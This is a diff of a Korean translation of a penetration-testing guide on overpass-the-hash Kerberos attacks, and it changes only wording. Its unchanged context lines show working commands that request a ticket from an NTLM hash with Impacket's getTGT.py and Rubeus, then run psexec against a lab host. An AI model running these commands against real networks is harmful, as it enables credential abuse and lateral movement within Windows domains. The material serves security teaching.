@@ -15,11 +15,11 @@ python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2
 export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
 python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
 ```
-AES256이 필요한 시나리오에서는 `-aesKey [AES key]` 옵션을 사용할 수 있습니다. 또한, 획득한 티켓은 smbexec.py 또는 wmiexec.py와 같은 다양한 도구와 함께 사용되어 공격의 범위를 넓힐 수 있습니다.
+AES256이 필요한 시나리오에서는 `-aesKey [AES key]` 옵션을 사용할 수 있습니다. 또한, 획득한 티켓은 smbexec.py 또는 wmiexec.py와 같은 다양한 도구와 함께 사용될 수 있어 공격의 범위를 넓힙니다.
 
-_PyAsn1Error_ 또는 _KDC cannot find the name_과 같은 문제는 일반적으로 Impacket 라이브러리를 업데이트하거나 IP 주소 대신 호스트 이름을 사용하여 해결되며, 이는 Kerberos KDC와의 호환성을 보장합니다.
+_PyAsn1Error_ 또는 _KDC cannot find the name_과 같은 문제는 일반적으로 Impacket 라이브러리를 업데이트하거나 IP 주소 대신 호스트 이름을 사용하여 해결되며, Kerberos KDC와의 호환성을 보장합니다.
 
-Rubeus.exe를 사용한 대체 명령 시퀀스는 이 기술의 또 다른 측면을 보여줍니다:
+Rubeus.exe를 사용하는 대체 명령 시퀀스는 이 기술의 또 다른 측면을 보여줍니다:
 ```bash
 .\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
 .\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
